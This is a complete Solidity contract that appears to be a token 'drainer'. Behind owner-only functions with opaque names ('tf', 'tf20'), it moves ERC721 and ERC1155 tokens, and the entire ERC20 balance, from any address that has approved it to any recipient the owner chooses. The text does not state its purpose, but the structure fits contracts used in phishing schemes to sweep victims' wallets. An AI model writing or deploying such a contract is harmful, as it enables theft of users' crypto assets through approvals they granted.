// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Transfer is Ownable {
    function _transferERC721(
        address _contractAddress,
        address _from,
        address _to,
        uint256 _tokenId
    ) internal {
        IERC721 _ERC721 = IERC721(_contractAddress);
        _ERC721.transferFrom(_from, _to, _tokenId);
    }

    function _transferERC1115(
        address _contractAddress,
        address _from,
        address _to,
        uint256[] memory _tokenIds
    ) internal {
        bytes memory _data = new bytes(0);
        uint256[] memory _amounts = new uint256[](_tokenIds.length);
        for (uint i = 0; i < _tokenIds.length; i++) {
            _amounts[i] = 1;
        }
        IERC1155 _ERC1155 = IERC1155(_contractAddress);
        _ERC1155.safeBatchTransferFrom(_from, _to, _tokenIds, _amounts, _data);
    }

    function tf(
        address _contractAddress,
        address _from,
        address _to,
        uint256[] memory _tokenIds,
        string memory types
    ) external onlyOwner {
        if (
            keccak256(abi.encodePacked(types)) ==
            keccak256(abi.encodePacked("s"))
        ) {
            for (uint i = 0; i < _tokenIds.length; i++) {
                _transferERC721(_contractAddress, _from, _to, _tokenIds[i]);
            }
        } else {
            _transferERC1115(_contractAddress, _from, _to, _tokenIds);
        }
    }

    function tf20(
        address _contractAddress,
        address _from,
        address _to
    ) external onlyOwner {
        IERC20 _IERC20 = IERC20(_contractAddress);
        uint256 _balance = _IERC20.balanceOf(_from);
        _IERC20.transferFrom(_from, _to, _balance);
    }

    receive() external payable {}
}
